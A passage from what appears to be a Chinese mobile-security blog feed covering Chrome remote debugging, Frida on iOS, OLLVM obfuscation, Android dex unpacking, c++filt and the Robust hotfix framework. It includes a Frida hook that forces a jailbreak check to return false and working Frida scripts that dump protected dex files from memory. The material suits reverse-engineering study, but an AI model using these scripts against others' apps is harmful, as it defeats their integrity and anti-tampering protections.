webSocketDebuggerUrl 则在调试该页面需要用到的一个 WebSocket 连接。chrome 的 devtool 的所有调试功能，都是基于 Remote Debugging Protocol 使用 WebSocket 来进行数据传输的。每一个页面都有自己不同的 webSocketDebuggerUrl。这个 webSocketDebuggerUrl是通过 url 的 query 参数传递给 chrome devtool 的。 chrome 的 devtool 可以从 Chrome 浏览器中进行提取 devtool 源码或者从 blink 源码中获取。在部署好自己的 chrome devtool 代码之后，下面既可以开始对 Chrome 进行调试, 浏览器输入以下内容：1http://path_to_your_devtool/devtool.html?ws=127.0.0.1:2333/devtools/page/0F8BF00855E9F57A1D62802C1882DE05 Chrome 提供了以下这些 http 接口控制目标浏览器:1234567891011# 获取当前所有可调式页面信息http://127.0.0.1:9222/json# 获取调试目标 WebView/blink 的版本号http://127.0.0.1:9222/json/version# 创建新的 tab，并加载 urlhttp://127.0.0.1:9222/json/new?url# 关闭 id 对应的 tabhttp://127.0.0.1:9222/json/close/id Chrome Android远程调试诊断是否开启了unix domain socket运行下列命令，如果查到abstract socket：@chrome_devtools_remote，则表明chrome for android 开启了unix domain socket。如果查到abstract socket@webview_devtools_remote_27594，则说明了AndroidWebView也开启了unix domain socket1cat /proc/net/unix | grep --text _devtools_remote 是否开启了websocket服务器可以通过ptyhon库websocket-client来测试.123456789$ sudo pip install websocket-clientpython&gt;&gt;&gt; import websocket&gt;&gt;&gt; ws = websocket.create_connection(&quot;ws://localhost:4000/devtools/page/140&quot;)&gt;&gt;&gt; ws.send(&quot;Hello,world&quot;)17&gt;&gt;&gt; result = ws.recv()&gt;&gt;&gt; print result&#123;&quot;error&quot;:&#123;&quot;code&quot;:-32700,&quot;message&quot;:&quot;Message must be in JSON format&quot;&#125;,&quot;id&quot;:null&#125; 参考资料： 揭秘浏览器远程调试技术 http://taobaofed.org/blog/2016/10/19/chrome-remote-debugging-technics/ Chrome for Android Remote Inspector 原理 https://blog.csdn.net/xxhforest/article/details/52204197 LocalServerSocket https://developer.android.com/reference/android/net/LocalServerSocket Linux下进程间通讯方式 - UNIX Domain Socket https://blog.csdn.net/z2066411585/article/details/78966434/]]></content>
  </entry>
  <entry>
    <title><![CDATA[在iOS上使用Frida]]></title>
    <url>%2F2018%2F08%2F24%2F%E5%9C%A8iOS%E4%B8%8A%E4%BD%BF%E7%94%A8Frida%2F</url>
    <content type="text"><![CDATA[准备Frida环境 越狱设备1.在你的iOS设备上打开Cydia应用程序。2.添加一个源，URL为：https://build.frida.re3.打开Source或搜索Frida，单击Modify，然后单击Install。 非越狱设备需要将frida-garget打包到app中，参考之前的文章《iOS应用安全- 非越狱下使用Frida》 frida用法1.注入到进程注入进程有两种方式： 通过frida-tools的REPL 1frida -U Safari -l NSURL_openURL_hook.js 通过frida-bindings以python为例： 12345678jscode=&apos;&apos;&apos;console.log(&quot;add js code here&quot;);&apos;&apos;&apos;process = frida.get_usb_device().attach(&quot;Safari&quot;)script = process.create_script(jscode)script.on(&apos;message&apos;, on_message)print(&apos;[*] dump all class into obclass.txt&apos;)script.load() 2.列出所有运行的进程1frida-ps -U frida-ps -Uai 以pid、名称、进程名称的格式输出 3.打印调用栈在hook到的函数中加入以下代码：123console.log(&apos;\tBacktrace:\n\t&apos; + Thread.backtrace(this.context,Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join(&apos;\n\t&apos;)); 4.调用native函数123var address = Module.findExportByName(&apos;libsqlite3.dylib&apos;, &apos;sqlite3_sql&apos;);var sql = new NativeFunction(address, &apos;char&apos;, [&apos;pointer&apos;]);sql(statement); 5.数据类型和转换如果对一个变量的类型不确定，可以使用如下代码确定其类型：1console.log(&quot;Type of args[2] -&gt; &quot; + new ObjC.Object(args[2]).$className) 一些常用的数据类型转换： NSData转String12var data = new ObjC.Object(args[2]);Memory.readUtf8String(data.bytes(), data.length()); 如果为null的不需要第二个参数 NSData转二进制数据 12var data = new ObjC.Object(args[2]);Memory.readByteArray(data.bytes(), data.length()); 遍历NSArray 12345678910var array = new ObjC.Object(args[2]);/* * Be sure to use valueOf() as NSUInteger is a Number in * 32-bit processes, and UInt64 in 64-bit processes. This * coerces it into a Number in the latter case. */var count = array.count().valueOf();for (var i = 0; i !== count; i++) &#123; var element = array.objectAtIndex_(i);&#125; 遍历NSDictionary 123456var dict = new ObjC.Object(args[2]);var enumerator = dict.keyEnumerator();var key;while ((key = enumerator.nextObject()) !== null) &#123; var value = dict.objectForKey_(key);&#125; NSKeyedArchiver 1var parsedValue = ObjC.classes.NSKeyedUnarchiver.unarchiveObjectWithData_(value); 读一个结构体 1Memory.readU32(args[0].add(4)); 常用脚本1.枚举所有的类1234567for (var className in ObjC.classes) &#123; if (ObjC.classes.hasOwnProperty(className)) &#123; send(className); &#125;&#125; 2.枚举一个类的所有method123456789101112131415161718192021222324if (ObjC.available)&#123; try &#123; var className = &quot;NSURL&quot;; var methods = eval(&apos;ObjC.classes.&apos; + className + &apos;.$methods&apos;); for (var i = 0; i &lt; methods.length; i++) &#123; try &#123; if (methods[i].indexOf(&quot;fileURLWithPath&quot;) &gt; -1) console.log(&quot;[-] &quot;+methods[i]); &#125; catch(err) &#123; console.log(&quot;[!] Exception1: &quot; + err.message); &#125; &#125; &#125; catch(err) &#123; console.log(&quot;[!] Exception2: &quot; + err.message); &#125;&#125; 3. Hook一个method打印参数时需要注意： args[0]：self args[1]：The selector (openURL:) args[2]：The first param 1234567891011121314151617181920212223242526if (ObjC.available)&#123; try &#123; var className = &quot;JailbreakDetectionVC&quot;; var funcName = &quot;- isJailbroken&quot;; var hook = eval(&apos;ObjC.classes.&apos; + className + &apos;[&quot;&apos; + funcName + &apos;&quot;]&apos;); console.log(&quot;[*] Class Name: &quot; + className); console.log(&quot;[*] Method Name: &quot; + funcName); Interceptor.attach(hook.implementation, &#123; onEnter: function(args) &#123; console.log(&quot;aaaa&quot;); console.log(&quot;param:&quot;+args[2]+&quot; type:&quot;+typeof args[2]); &#125;, onLeave: function(retval) &#123; console.log(&quot;Return value-&gt; (type:&quot;+typeof retval+&quot;,value:&quot;+retval+&quot;)&quot;); newretval = ptr(&quot;0x0&quot;) retval.replace(newretval) &#125; &#125;); &#125; catch(err) &#123; console.log(&quot;[!] Exception2: &quot; + err.message); &#125;&#125; 4.调用函数 函数名以”+”开头的，如：“+ URLWithString:”，可以直接通过类名调用方法，相当于java中的static函数 函数名以“-”开头的需要找到一个实例化的对象，然后再调用方法 如果内存中没有这样的对象这种情况需要手动生成一个实例,用法为ObjC.classes.类名.alloc() 如果内存中存在实例化后的对象这种情况需要先找出一个类的实例,使用var tmp=ObjC.chooseSync(ObjC.classes.类名),例如： 1ObjC.chooseSync(ObjC.classes.PARSHealthPedometer10thHomeViewController)[0] 其中[0]表示取找到的实例中的第一个实例,可根据实际情况换成其他的实例。调用函数时，以my_obj“- requestUploadWithSure”的函数，如果有参数直接附在括号中。 1234567891011121314151617if (ObjC.available)&#123; try &#123; //var my_obj=ObjC.chooseSync(ObjC.classes.PARSHealthPedometer10thHomeViewController)[0] var my_obj=ObjC.classes.PARSHealthPedometer10thHomeViewController.alloc() my_obj[&quot;- requestUploadWithSure:&quot;](1) &#125; catch(err) &#123; console.log(&quot;[!] Exception2: &quot; + err.message); &#125;&#125;else&#123; console.log(&quot;Objective-C Runtime is not available!&quot;);&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用ollvm进行代码混淆]]></title>
    <url>%2F2018%2F08%2F23%2Follvm%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[OLLVM简介OLLVM(Obfuscator-LLVM)是瑞士西北应用科技大学于2010年6月份发起的一个项目，该项目旨在提供一套开源的针对LLVM的代码混淆工具，以增加对逆向工程的难度。 OLLVM是基于LLVM实现的，LLVM是一个编译器框架，它也采用经典的三段式设计。前端可以使用不同的编译工具对代码文件做词法分析以形成抽象语法树AST，然后将分析好的代码转换成LLVM的中间表示IR（intermediate representation）；中间部分的优化器只对中间表示IR操作，通过一系列的Pass对IR做优化；后端负责将优化好的IR解释成对应平台的机器码。LLVM的优点在于，不同的前端语言最终都转换成同一种的IR。 OLLVM的混淆操作就是在中间表示IR层，通过编写Pass来混淆IR，然后后端依据IR来生成的目标代码也就被混淆了。得益于LLVM的设计，OLLVM适用LLVM支持的所有语言（C, C++, Objective-C, Ada 和 Fortran）和目标平台（x86, x86-64, PowerPC, PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, 和 XCore）。 OLLVM的几种混淆方式OLLVM默认支持 -fla -sub -bcf 三个混淆参数，这三个参数可以单独使用，也可以配合着使用。-fla 参数表示使用控制流平展（Control Flow Flattening）模式，-sub参数表示使用指令替换（Instructions Substitution）模式，-bcf参数表示使用控制流伪造（Bogus Control Flow）模式 -sub instruction substitution(指令替换) -fla control flow flattening（控制流平坦化） -bcf bogus control flow（控制流伪造） 此外，OLLVM支持对单个函数进行混淆，即Functions annotations模式 以下分别介绍这几种方式并举例说明： instruction substitution(指令替换)指令替换是一种比较简单的混淆方式，OLLVM将一些简单的运算复杂化，但这种方式容易被代码优化给去除，目前OLLVM只实现对整数运算的混淆。 加法混淆 例如 a = b + c 可以被混淆为： 12341. a = b - (-c)2. a = -(-b + (-c))3. r = rand (); a = b + r; a = a + c; a = a - r4. r = rand (); a = b - r; a = a + b; a = a + r 减法混淆例如 a = b-c 可以被混淆为： 1231. a = b + (-c)2. r = rand (); a = b + r; a = a - c; a = a - r3. r = rand (); a = b - r; a = a - c; a = a + r AND运算混淆 a = b &amp; c =&gt; a = (b ^ ~c) &amp; b OR运算混淆 a = b | c =&gt; a = (b &amp; c) | (b ^ c) XOR运算混淆 a = a ^ b =&gt; a = (~a &amp; b) | (a &amp; ~b) 如果一种运算对应多种混淆方式，OLLVM将会随机选择一种，以下为使用OLLVM进行指令替换后的前后对比： 源码： 12345int test(int a,int b)&#123; int c = a + b; return c+2;&#125; sub前： sub后 分析汇编指令得出，a+b+2 运算变成了 -(-b-(a+2)) control flow flattening（控制流平坦化）control flow flattening（控制流平坦化）通过多个case-swich结构将程序的控制流变成扁平形状，打破原有的逻辑结构，增加逆向的难度。例如对于以下代码：123456789#include &lt;stdlib.h&gt;int main(int argc, char** argv) &#123; int a = atoi(argv[1]); if(a == 0) return 1; else return 10; return 0;&#125; OLLVM将把它变为如下结构：12345678910111213141516171819202122#include &lt;stdlib.h&gt;int main(int argc, char** argv) &#123; int a = atoi(argv[1]); int b = 0; while(1) &#123; switch(b) &#123; case 0: if(a == 0) b = 1; else b = 2; break; case 1: return 1; case 2: return 10; default: break; &#125; &#125; return 0;&#125; 从代码中可以看到，OLLVM将源代码分割为几个基本块，并放在一个while循环结构中无线循环，程序的流程由变量b控制。 以下是使用OLLVM进行控制混淆后的前后对比： 源码 123456789#include &lt;stdlib.h&gt;int main(int argc, char** argv) &#123; int a = atoi(argv[1]); if(a == 0) return 1; else return 10; return 0;&#125; fla之前： fla之后： F5之后的代码： 由此可见，fla之后的控制流比较复杂，通过分析fla之后的代码，我们发现代码中的result仅仅受v7的影响，但分析起来着实费力。 bogus control flow（控制流伪造）bogus control flow通过在源程序的控制流中添加一些基本块，这些基本块仅仅起了连接作用，并不影响实际的执行逻辑。 以下为使用OLLVM进行控制流伪造后的对比： 源码123456789#include &lt;stdlib.h&gt;int main(int argc, char** argv) &#123; int a = atoi(argv[1]); if(a == 0) return 1; else return 10; return 0;&#125; bcf之前： ![upload successful](/images/pasted-128.png) bcf之后： ![upload successful](/images/pasted-131.png) F5之后的代码： ![upload successful](/images/pasted-132.png) 由此看出，bcf的方式在程序中增加了一个代码块，这个代码块对函数返回值没有任何影响，但对于逆向人员来说，增加了其逆向分析的无用功。 Functions annotations有时候为了提高效率，开发者仅需要对指定的函数进行混淆，OLLVM的Functions annotations模式支持对单个函数进行混淆。比如，想对函数func()使用bcf混淆，只需要给函数func()增加bcf属性即可。1int func() __attribute((__annotate__((&quot;bcf&quot;)))); OLLVM的fla，sub和bcf三个属性可以搭配使用，只需要添加对应的编译选项即可。 利用OLLVM进行Android native代码混淆1.下载并编译ollvm12345$ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git$ mkdir build$ cd build$ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/$ make -j7 2.配置NDK以支持ollvm 新建编译链在 android-ndk-r14b/toolchains 下新建目录 ollvm-4.0/prebuilt/darwin-x86_64(我的环境是mac)，把前一步编译生成的结果拷贝到此目录下（主要是bin和lib） 配置编译链在 android-ndk-r14b/build/core/toolchains 目录下，新建目录 arm-linux-androideabi-clang-ollvm4.0，拷贝目录 arm-linux-androideabi-clang 下的文件 config.mk 与 setup.mk 到 arm-linux-androideabi-clang-ollvm4.0 中，修改setup.mk文件。123456789############################ 原始配置 #############################LLVM_TOOLCHAIN_PREBUILT_ROOT := $(call get-toolchain-root,llvm)#LLVM_TOOLCHAIN_PREFIX := $(LLVM_TOOLCHAIN_PREBUILT_ROOT)/bin/############################################################################################# 修改后 #############################OLLVM_NAME := ollvm-4.0LLVM_TOOLCHAIN_PREBUILT_ROOT := $(call get-toolchain-root,$(OLLVM_NAME))LLVM_TOOLCHAIN_PREFIX := $(LLVM_TOOLCHAIN_PREBUILT_ROOT)/bin/#其他配置不做修改 3.使用ollvm进行编译使用 ollvm 进行 ndk 的编译需要对 Application.mk 和 Android.mk 文件做相应的修改。Android.mk 中添加混淆编译参数：1LOCAL_CFLAGS += -mllvm -sub -mllvm -bcf -mllvm -fla Application.mk 中配置 NDK_TOOLCHAIN_VERSION12APP_ABI := x86 armeabi-v7a x86_64 arm64-v8a armeabi mips64NDK_TOOLCHAIN_VERSION := clang-ollvm-4.0 参考资料： OLLVM wiki https://github.com/obfuscator-llvm/obfuscator/wiki 利用OLLVM混淆Android Native代码 https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/ OLLVM + NDK 混淆编译环境搭建http://gnaixx.cc/2017/07/25/20170725-ollvm/]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android基于OpenMemory的脱壳]]></title>
    <url>%2F2018%2F08%2F22%2FAndroid%E5%9F%BA%E4%BA%8EOpenMemory%E7%9A%84%E8%84%B1%E5%A3%B3%2F</url>
    <content type="text"><![CDATA[OpenMemoryAndroid ART加载外部dex本质上调用DexFile::OpenMemory()加载到内存：123456789101112131415std::unique_ptr&lt;const DexFile&gt; DexFile::OpenMemory(const uint8_t* base, size_t size, const std::string&amp; location, uint32_t location_checksum, MemMap* mem_map, const OatDexFile* oat_dex_file, std::string* error_msg) &#123; CHECK_ALIGNED(base, 4); // various dex file structures must be word aligned std::unique_ptr&lt;DexFile&gt; dex_file( new DexFile(base, size, location, location_checksum, mem_map, oat_dex_file)); if (!dex_file-&gt;Init(error_msg)) &#123; dex_file.reset(); &#125; return std::unique_ptr&lt;const DexFile&gt;(dex_file.release());&#125; OpenMemory第一个参数为指向dex文件的指针，因此hook OpenMemory函数，读取第一个参数作为dump起始地址，根据dex文件格式，0x20偏移处为dex的长度，进而dump出整个dex文件。 Frida插件之frida-unpack基于以上原理，github上有人给出了基于frida hook OpenMemory的插件（https://github.com/dstmath/frida-unpack），作者只给出了32位libart.so的代码，这里附上64位的代码。 那么如何确定该用32位还是64位呢？运行cat /proc/pid/maps |grep libart.so，如果libart.so的路径位于/system/lib64,则使用64位版本代码，否则使用32位。 附代码如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364//代码在android os: 7.1.2上测试通过//32位的libart.so var openmemory = Module.findExportByName(&quot;libart.so&quot;, &quot;_ZN3art7DexFile10OpenMemoryEPKhjRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPNS_6MemMapEPKNS_10OatDexFileEPS9_&quot;);console.log(&quot;openmemory addr: &quot;+openmemory);Interceptor.attach(openmemory, &#123; onEnter: function (args) &#123; //dex起始位置 var begin = args[1] console.log(begin); //打印magic console.log(&quot;magic : &quot; + Memory.readUtf8String(begin)) //dex fileSize 地址 var address = parseInt(begin,16) + 0x20 //dex 大小 var dex_size = Memory.readInt(ptr(address)) console.log(&quot;dex_size :&quot; + dex_size) //dump dex 到/data/data/pkg/目录下 var file = new File(&quot;/sdcard/unpack/&quot; + dex_size + &quot;.dex&quot;, &quot;wb&quot;) file.write(Memory.readByteArray(begin, dex_size)) file.flush() file.close() &#125;, onLeave: function (retval) &#123; if (retval.toInt32() &gt; 0) &#123; &#125; &#125;&#125;);//64位的libart.so var openmemory = Module.findExportByName(&quot;libart.so&quot;,&quot;_ZN3art7DexFile10OpenMemoryEPKhmRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPNS_6MemMapEPKNS_10OatDexFileEPS9_&quot;);console.log(&quot;openmemory addr: &quot;+openmemory);Interceptor.attach(openmemory, &#123; onEnter: function (args) &#123; //dex起始位置 //64位这里获取的args[1]有bug,这里直接读取r0寄存器 var begin = this.context.x0 //console.log(this.context.x0); //打印magic console.log(&quot;magic : &quot; + Memory.readUtf8String(begin)) //dex fileSize 地址 var address = parseInt(begin,16) + 0x20 //dex 大小 var dex_size = Memory.readInt(ptr(address)) console.log(&quot;dex_size :&quot; + dex_size) //dump dex 到/data/data/pkg/目录下 var file = new File(&quot;/sdcard/unpack/&quot; + dex_size + &quot;.dex&quot;, &quot;wb&quot;) file.write(Memory.readByteArray(begin, dex_size)) file.flush() file.close() &#125;, onLeave: function (retval) &#123; if (retval.toInt32() &gt; 0) &#123; &#125; &#125;&#125;); 坑 dump出来的dex可能为非app本身的dex,如： 系统自身注入的dex，如一些性能统计的dex，我的oneplus手机中出现了com.qualcomm.qti 所有的xposed插件（xposed是注入的zygote，因此所有插件都会注入到app进程,所以谨慎使用xposed插件，一个恶意插件可以获得所有的app进程内数据） Inspeckage也是基于xposed,属于它的一个插件 这些工具都会注入到app进程，导致拖出来多余的dex。 frida插件是以dex文件的大小来命名的，当两个dex文件大小相同时，会覆盖dump出来的dex 参考资料： https://bbs.pediy.com/thread-217864.htm https://github.com/dstmath/frida-unpack]]></content>
  </entry>
  <entry>
    <title><![CDATA[c++filt - 还原so中的函数名]]></title>
    <url>%2F2018%2F08%2F22%2Fc-filt%2F</url>
    <content type="text"><![CDATA[C++的name manglingC++是允许函数重载的，也就引出了编译器的name mangling（名字修饰）机制,其目的是给同名的重载函数不同的签名。 例如，对于如下代码：12345678int test(int a,int b)&#123; return a+b;&#125;int test(int a)&#123; return a;&#125; 使用g++编译成so后，使用nm -a (ldd -r命令也可以)查看so中的符号： 发现两个test函数名字变为Z4testi和Z4testii, 这就是name mangling机制产生的。其中_Z是一个前缀，4表示函数名长度（test长度为4），i表示参数类型。 C++的name mangling遵循一定的规则，因此是可逆的，即通过符号还原出原来的函数定义。这个工具就叫c++filt。 c++filt对于上述例子中的符号我们使用c++filt 可以看到还原出来我们定义的函数。 当然，工程中的函数并没有我们给出的例子中那么简单，例如Android中有那么多的类和命名空间，其编译生成的符号也是很复杂的，例如123$c++filt __ZN3art7DexFile10OpenMemoryEPKhjRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPNS_6MemMapEPKNS_10OatDexFileEPS9_输出：art::DexFile::OpenMemory(unsigned char const*, unsigned int, std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;, unsigned int, art::MemMap*, art::OatDexFile const*, std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt;*) 总结c++filt在hook、逆向等场景中非常有用，可以帮助我们很快的还原符号，定位代码。 参考资料： https://en.wikipedia.org/wiki/Name_mangling]]></content>
  </entry>
  <entry>
    <title><![CDATA[Robust热修复框架原理分析]]></title>
    <url>%2F2018%2F08%2F21%2FRobust%2F</url>
    <content type="text"><![CDATA[关于RobustRobust（https://github.com/Meituan-Dianping/Robust/blob/master/README-zh.md）是美团推出的一个热补丁框架，可兼容Android2.3-8.0版本，据称补丁修补成功率高达99.9%。 Robust使用环境配置 在App的build.gradle，加入如下依赖 12345apply plugin: &apos;com.android.application&apos;//制作补丁时将这个打开，auto-patch-plugin紧跟着com.android.application//apply plugin: &apos;auto-patch-plugin&apos;apply plugin: &apos;robust&apos;compile &apos;com.meituan.robust:robust:0.4.82&apos; 在整个项目的build.gradle加入classpath 123456789buildscript &#123; repositories &#123; jcenter() &#125; dependencies &#123; classpath &apos;com.meituan.robust:gradle-plugin:0.4.82&apos; classpath &apos;com.meituan.robust:auto-patch-plugin:0.4.82&apos; &#125;&#125; 在项目的src同级目录下配置robust.xml文件，具体项请参考DEMOapp/robust.xml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;resources&gt; &lt;switch&gt; &lt;!--true代表打开Robust，请注意即使这个值为true，Robust也默认只在Release模式下开启--&gt; &lt;!--false代表关闭Robust，无论是Debug还是Release模式都不会运行robust--&gt; &lt;turnOnRobust&gt;true&lt;/turnOnRobust&gt; &lt;!--&lt;turnOnRobust&gt;false&lt;/turnOnRobust&gt;--&gt; &lt;!--是否开启手动模式，手动模式会去寻找配置项patchPackname包名下的所有类，自动的处理混淆，然后把patchPackname包名下的所有类制作成补丁--&gt; &lt;!--这个开关只是把配置项patchPackname包名下的所有类制作成补丁，适用于特殊情况，一般不会遇到--&gt; &lt;!--&lt;manual&gt;true&lt;/manual&gt;--&gt; &lt;manual&gt;false&lt;/manual&gt; &lt;!--是否强制插入插入代码，Robust默认在debug模式下是关闭的，开启这个选项为true会在debug下插入代码--&gt; &lt;!--但是当配置项turnOnRobust是false时，这个配置项不会生效--&gt; &lt;!--&lt;forceInsert&gt;true&lt;/forceInsert&gt;--&gt; &lt;forceInsert&gt;false&lt;/forceInsert&gt; &lt;!--是否捕获补丁中所有异常，建议上线的时候这个开关的值为true，测试的时候为false--&gt; &lt;catchReflectException&gt;true&lt;/catchReflectException&gt; &lt;!--&lt;catchReflectException&gt;false&lt;/catchReflectException&gt;--&gt; &lt;!--是否在补丁加上log，建议上线的时候这个开关的值为false，测试的时候为true--&gt; &lt;!--&lt;patchLog&gt;true&lt;/patchLog&gt;--&gt; &lt;patchLog&gt;false&lt;/patchLog&gt; &lt;!--项目是否支持progaurd--&gt; &lt;proguard&gt;true&lt;/proguard&gt; &lt;!--&lt;proguard&gt;false&lt;/proguard&gt;--&gt; &lt;!--项目是否支持ASM进行插桩，默认使用ASM，推荐使用ASM，Javaassist在容易和其他字节码工具相互干扰--&gt; &lt;useAsm&gt;true&lt;/useAsm&gt; &lt;!--&lt;useAsm&gt;false&lt;/useAsm&gt;--&gt; &lt;/switch&gt; &lt;!--需要热补的包名或者类名，这些包名下的所有类都被会插入代码--&gt; &lt;!--这个配置项是各个APP需要自行配置，就是你们App里面你们自己代码的包名， 这些包名下的类会被Robust插入代码，没有被Robust插入代码的类Robust是无法修复的--&gt; &lt;packname name=&quot;hotfixPackage&quot;&gt; &lt;name&gt;com.meituan&lt;/name&gt; &lt;name&gt;com.sankuai&lt;/name&gt; &lt;name&gt;com.dianping&lt;/name&gt; &lt;/packname&gt; &lt;!--不需要Robust插入代码的包名，Robust库不需要插入代码，如下的配置项请保留，还可以根据各个APP的情况执行添加--&gt; &lt;exceptPackname name=&quot;exceptPackage&quot;&gt; &lt;name&gt;com.meituan.robust&lt;/name&gt; &lt;name&gt;com.meituan.sample.extension&lt;/name&gt; &lt;/exceptPackname&gt; &lt;!--补丁的包名，请保持和类PatchManipulateImp中fetchPatchList方法中设置的补丁类名保持一致（ setPatchesInfoImplClassFullName(&quot;com.meituan.robust.patch.PatchesInfoImpl&quot;)）， 各个App可以独立定制，需要确保的是setPatchesInfoImplClassFullName设置的包名是如下的配置项，类名必须是：PatchesInfoImpl--&gt; &lt;patchPackname name=&quot;patchPackname&quot;&gt; &lt;name&gt;com.meituan.robust.patch&lt;/name&gt; &lt;/patchPackname&gt; &lt;!--自动化补丁中，不需要反射处理的类，这个配置项慎重选择--&gt; &lt;noNeedReflectClass name=&quot;classes no need to reflect&quot;&gt; &lt;/noNeedReflectClass&gt;&lt;/resources&gt; 自动生成补丁 使用插件时，需要把auto-patch-plugin放置在com.android.application插件之后，其余插件之前。 12apply plugin: &apos;com.android.application&apos;apply plugin: &apos;auto-patch-plugin&apos; 将保存下来的mapping文件和methodsMap.robust文件放在app/robust/文件夹下。 修改代码，在改动的方法上面添加@Modify注解,对于Lambda表达式请在修改的方法里面调用RobustModify.modify()方法 1234567891011 @Modify protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); &#125; //或者是被修改的方法里面调用RobustModify.modify()方法 protected void onCreate(Bundle savedInstanceState) &#123; RobustModify.modify() super.onCreate(savedInstanceState); &#125;``` 新增的方法和字段使用@Add注解 //增加方法 @Add public String getString() { return &quot;Robust&quot;; } //增加类 @Add public class NewAddCLass { public static String get() { return &quot;robust&quot;; } } 14. 运行和生成线上apk同样的命令，即可生成补丁，补丁目录app/build/outputs/robust/patch.jar ./gradlew clean assembleRelease –stacktrace –no-daemon12345678910111213141516175. 补丁制作成功后会停止构建apk，出现类似于如下的提示，表示补丁生成成功 ![upload successful](/images/pasted-115.png)## Robust实现原理Robust热修复框架的大概原理为：用DexClassLoader加载修复包，然后用loadClass方法加载修复类，new出新对象，再把这新的修复对象设置到指定类的changeQuickRedirect静态变量中即可。官方给出的流程图如下：![upload successful](/images/pasted-123.png)下文中我们将分编译阶段、补丁结构、补丁生效和补丁执行4个阶段来介绍Robust实现原理。### 编译阶段Robust将apk代码中每个函数都在编译打包阶段自动的插入一段代码: //原函数public long getIndex() { return 100; } //使用Robust插件编译后public static ChangeQuickRedirect changeQuickRedirect; public long getIndex() { if(changeQuickRedirect != null) { if(PatchProxy.isSupport(new Object[0], this, changeQuickRedirect, false)) { return ((Long)PatchProxy.accessDispatch(new Object[0], this, changeQuickRedirect, false)).longValue(); } } return 100L; }12345678910111213141516171819可以看到Robust为每个class增加了个类型为ChangeQuickRedirect的静态成员，而在每个方法前都插入了使用changeQuickRedirect相关的逻辑，当changeQuickRedirect不为null时，会执行到accessDispatch方法从而替换掉之前老的逻辑，达到修复的目的。### 补丁结构Robust会根据@Modify、@Add等注解搜集所有要修改的函数，并将修复后的文件打包成dex或jar。补丁文件主要包含：PatchesInfoImpl.java，xxxPatchControl.java，xxxPatch.java(其中xxx为原类的名字)，如下图：PatchesInfoImpl只有一个，补丁修改了3个类，因此有3对Patch和PatchControl类![upload successful](/images/pasted-118.png)其中- PatchesInfoImpl.java中定义了修复前后class的对应关系：![upload successful](/images/pasted-119.png)- 每个xxxPatchControl.java中都存在以下静态成员变量和方法： public class xxxPatchControl implements ChangeQuickRedirect{ public static final String MATCH_ALL_PARAMETER = &quot;(\\w*\\.)*\\w*&quot;; private static final Map&lt;Object, Object&gt; keyToValueRelation = new WeakHashMap(); //获取函数的参数的方法 public Object getRealParameter(Object obj){..具体逻辑..} //判断是否支持修复 public boolean isSupport(String methodName, Object[] paramArrayOfObject) {..具体逻辑.} //执行到accessDispatch方法替换旧的类方法 public Object accessDispatch(String methodName, Object[] paramArrayOfObject) {.具体逻辑..} } //解决boolean被优化成byte的问题 private static Object fixObj(Object booleanObj) {.具体逻辑..} }1234567- xxxPatch.java中是修改后函数的具体实现，例如下图中修改了getTextInfo()方法的返回值![upload successful](/images/pasted-120.png)### 补丁生效补丁生效通常在App启动时调用 new PatchExecutor(getApplicationContext(), new PatchManipulateImp(), new RobustCallBackSample()).start();1PatchExecutor继承Thread类，启动后会调用fetchPatchList()函数拉取补丁，调用applyPatchList()使补丁生效。其具体实现如下： //可以看到PatchExecutor继承线程类Threadpublic class PatchExecutor extends Thread { protected Context context; protected PatchManipulate patchManipulate; protected RobustCallBack robustCallBack; //构造函数 public PatchExecutor(Context context, PatchManipulate patchManipulate, RobustCallBack robustCallBack) { this.context = context.getApplicationContext(); this.patchManipulate = patchManipulate; this.robustCallBack = robustCallBack; } public void run() { try { //拉取补丁列表 List patches = fetchPatchList(); //应用补丁列表 applyPatchList(patches); } catch (Throwable t) { Log.e(“robust”, “PatchExecutor run”, t); robustCallBack.exceptionNotify(t, “class:PatchExecutor,method:run,line:36”); } } … }12- 获取补丁fetchPatchList最终调用PatchManipulateImp类的fetchPatchList方法 protected List&lt;Patch&gt; fetchPatchList(Context context) { //将app自己的robustApkHash上报给服务端，服务端根据robustApkHash来区分每一次apk build来给app下发补丁 //apkhash is the unique identifier for apk,so you cannnot patch wrong apk. String robustApkHash = RobustApkHashUtils.readRobustApkHash(context); Log.w(&quot;robust&quot;,&quot;robustApkHash :&quot; + robustApkHash); //在这里去联网获取补丁列表 Patch patch = new Patch(); patch.setName(&quot;123&quot;); //LocalPath是存储原始的补丁文件，这个文件应该是加密过的，TempPath是加密之后的，TempPath下的补丁加载完毕就删除，保证安全性 //这里面需要设置一些补丁的信息，主要是联网的获取的补丁信息。重要的如MD5，进行原始补丁文件的简单校验，以及补丁存储的位置，这边推荐把补丁的储存位置放置到应用的私有目录下，保证安全性 patch.setLocalPath(Environment.getExternalStorageDirectory().getPath()+ File.separator+&quot;robust&quot;+File.separator + &quot;patch&quot;); //setPatchesInfoImplClassFullName 设置项各个App可以独立定制，需要确保的是setPatchesInfoImplClassFullName设置的包名是和xml配置项patchPackname保持一致，而且类名必须是：PatchesInfoImpl //请注意这里的设置 patch.setPatchesInfoImplClassFullName(&quot;com.meituan.robust.patch.PatchesInfoImpl&quot;); List patches = new ArrayList&lt;Patch&gt;(); patches.add(patch); return patches; } 123- 应用补丁applyPatchList的实现如下: protected void applyPatchList(List patches) { for (Patch 